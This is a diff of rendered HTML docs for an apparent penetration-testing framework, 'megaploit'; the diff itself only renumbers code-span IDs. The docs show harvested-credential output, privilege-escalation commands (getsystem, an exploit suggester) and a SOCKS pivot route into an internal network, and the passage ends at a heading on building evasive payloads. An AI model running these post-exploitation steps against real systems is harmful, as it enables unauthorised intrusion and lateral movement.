-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>megaploit &gt; db_hosts
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>Host              OS           First seen
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>192.168.1.100     Windows 10   2024-01-15 14:25:00
-</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>
-</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>megaploit &gt; db_creds
-</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>User    Password         Source
-</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>john    SuperSecret123   filesystem
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>megaploit &gt; db_status
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>[*] Database: connected (megaploit.db)
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>megaploit &gt; db_hosts
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>Host              OS           First seen
+</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>192.168.1.100     Windows 10   2024-01-15 14:25:00
+</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>
+</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>megaploit &gt; db_creds
+</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>User    Password         Source
+</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>john    SuperSecret123   filesystem
 </span></code></pre></div>
 <h3 id="export-to-a-file">Export to a file<a class="headerlink" href="#export-to-a-file" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>megaploit &gt; db_export /root/engagement/report.json
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>[+] Exported 3 hosts, 2 credentials to report.json
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>megaploit &gt; db_export /root/engagement/report.json
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>[+] Exported 3 hosts, 2 credentials to report.json
 </span></code></pre></div>
 <hr />
 <h2 id="10-whats-next">10. What's Next?<a class="headerlink" href="#10-whats-next" title="Permanent link">&para;</a></h2>
@@ -1175,25 +1175,25 @@
 <h3 id="learn-more-commands">Learn more commands<a class="headerlink" href="#learn-more-commands" title="Permanent link">&para;</a></h3>
 <p>→ <a href="../CLI_REFERENCE/"><code>docs/CLI_REFERENCE.md</code></a> — every single command with examples</p>
 <h3 id="escalate-privileges">Escalate privileges<a class="headerlink" href="#escalate-privileges" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># Check what privileges you have</span>
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>getprivs
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
-</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="c1"># Try automatic privilege escalation</span>
-</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>getsystem
-</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
-</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="c1"># Run local exploit suggester</span>
-</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>post/suggest_exploit
-</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>SESSION<span class="w"> </span>session-1
-</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>run
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1"># Check what privileges you have</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>getprivs
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="c1"># Try automatic privilege escalation</span>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>getsystem
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="c1"># Run local exploit suggester</span>
+</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>post/suggest_exploit
+</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>SESSION<span class="w"> </span>session-1
+</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>run
 </span></code></pre></div>
 <p>→ See <a href="../MODULE_SYSTEM/"><code>docs/MODULE_SYSTEM.md</code></a> for the full module list</p>
 <h3 id="pivot-into-the-internal-network">Pivot into the internal network<a class="headerlink" href="#pivot-into-the-internal-network" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># Add a pivot route through this session</span>
-</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>route<span class="w"> </span>add<span class="w"> </span><span class="m">10</span>.10.10.0/24<span class="w"> </span>session-1
-</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
-</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="c1"># Set up a SOCKS5 proxy</span>
-</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>socks_start<span class="w"> </span><span class="m">1080</span>
-</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="c1"># Now proxychains routes through the target</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1"># Add a pivot route through this session</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>route<span class="w"> </span>add<span class="w"> </span><span class="m">10</span>.10.10.0/24<span class="w"> </span>session-1
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="c1"># Set up a SOCKS5 proxy</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>socks_start<span class="w"> </span><span class="m">1080</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="c1"># Now proxychains routes through the target</span>
 </span></code></pre></div>
 <p>→ See <a href="../NETWORKING/"><code>docs/NETWORKING.md</code></a> for the full pivoting guide</p>
 <h3 id="build-a-more-evasive-payload">Build a more evasive payload<a class="headerlink" href="#build-a-more-evasive-payload" title="Permanent link">&para;</a></h3>
